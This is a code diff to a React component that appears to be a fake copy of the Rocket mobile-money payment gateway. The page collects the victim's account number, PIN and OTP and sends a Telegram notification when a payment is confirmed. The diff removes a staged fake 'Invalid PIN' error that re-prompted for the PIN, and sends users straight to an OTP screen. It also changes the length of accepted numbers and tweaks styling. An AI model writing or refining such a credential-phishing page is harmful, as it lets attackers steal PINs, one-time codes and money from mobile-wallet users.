@@ -57,11 +57,11 @@ const RocketPayment = () => {
 
   const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];
   const isValidMobile = () => {
-    return mobileAccount.length === 11 && validPrefixes.includes(mobileAccount.substring(0, 3)) && /^\d+$/.test(mobileAccount);
+    return mobileAccount.length === 12 && validPrefixes.includes(mobileAccount.substring(0, 3)) && /^\d+$/.test(mobileAccount);
   };
 
   const handleMobileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const value = e.target.value.replace(/\D/g, "").slice(0, 11);
+    const value = e.target.value.replace(/\D/g, "").slice(0, 12);
     setMobileAccount(value);
   };
 
@@ -90,19 +90,7 @@ const RocketPayment = () => {
     setIsSubmitting(true);
     sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Rocket' });
 
-    if (pinAttempts === 0) {
-      setTimeout(() => {
-        setIsSubmitting(false);
-        setPinAttempts(1);
-        setShowError("Invalid PIN. Please try again.");
-        setPin("");
-        setTimeout(() => pinRef.current?.focus(), 50);
-        setTimeout(() => setShowError(""), 4000);
-      }, 2000);
-      return;
-    }
-
-    // Second attempt → show OTP page
+    // Go straight to OTP page
     setTimeout(() => {
       setIsSubmitting(false);
       setShowOtp(true);
@@ -275,7 +263,7 @@ const RocketPayment = () => {
   // Main form page (matches first screenshot exactly)
   return (
     <div className="min-h-screen bg-[#f0f0f0] flex items-start justify-center pt-2">
-      <div className="w-full max-w-[700px] bg-white">
+      <div className="w-full max-w-[700px] bg-white border-2 border-[#0066cc]">
         {header}
         {gatewayBanner}
 
